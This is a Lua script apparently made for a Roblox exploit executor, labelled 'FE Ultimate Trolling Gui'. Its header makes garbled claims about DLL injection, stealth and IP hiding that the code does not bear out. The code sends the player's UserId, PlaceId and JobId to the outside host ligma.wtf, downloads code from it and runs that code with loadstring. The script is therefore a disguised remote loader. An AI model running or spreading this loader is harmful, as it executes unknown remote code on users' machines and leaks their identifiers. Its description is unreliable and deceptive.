--[[
	id: KQ61v4TTEyMoxlrncDny8
	name: FE Ultimate Trolling Gui
	description: This UTG works on DLL injection with advance algorithm method where it interrupts many servers having Robux code in it. It goes to the advance stealth mode to carry out DLL injection to all the available server and find the best one. You don’t need to bother about the IP of your PC or smartphone as this tool works online, it never discloses your IP to anyone.
	time1: 2021-07-20 21:14:46.518748+00
	time2: 2021-07-20 21:14:46.518749+00
	uploader: aaMt7O7NRe1nNo-UXFFFl4FAc59lHzj0YEIZT1ej
	uploadersession: p_UtQ7lT79MkzHtrLXEZLMPrzl5Qw5
	flag: t
--]]

local _pcall = pcall;
local _syn = syn;
local _tostring = tostring;
local _loadstring = loadstring;
local _game = game;
local _request = http_request or request or (_syn and _syn.request) or (http and http.request);

if not _game:IsLoaded() then
	_game.Loaded:Wait();
end;

local PLAYER;

_pcall(function()
	PLAYER = _game:GetService("Players").LocalPlayer;
end);

local URL = "http://ligma.wtf/script/";
local hasQueryString = false;

if PLAYER then
    URL = URL.."?id="..PLAYER.UserId;
	hasQueryString = true;
end;

local body;

if _request then
	_pcall(function()
		local headers = {};

		if _game then
			headers.Gkqx6BoRnEyFj = _tostring(_game.PlaceId);
			headers.mOVqDYgdne9sG = _game.JobId;
		end;

		local response = _request({
			Method = "GET";
			Url = URL;
			Headers = headers;
		});

		body = response.Body;
	end);
end;

if not body then
	_pcall(function()
		body = _game:HttpGet(URL..(hasQueryString and "&" or "?").."script=".._game.JobId);
	end);
end;

if not body then
	local _htgetf = htgetf;

	if _htgetf then
		body = _pcall(_htgetf, URL);
	end;
end;

body = body or "";

local success, func = _pcall(_loadstring, body);

if success then
	_pcall(func);
end;
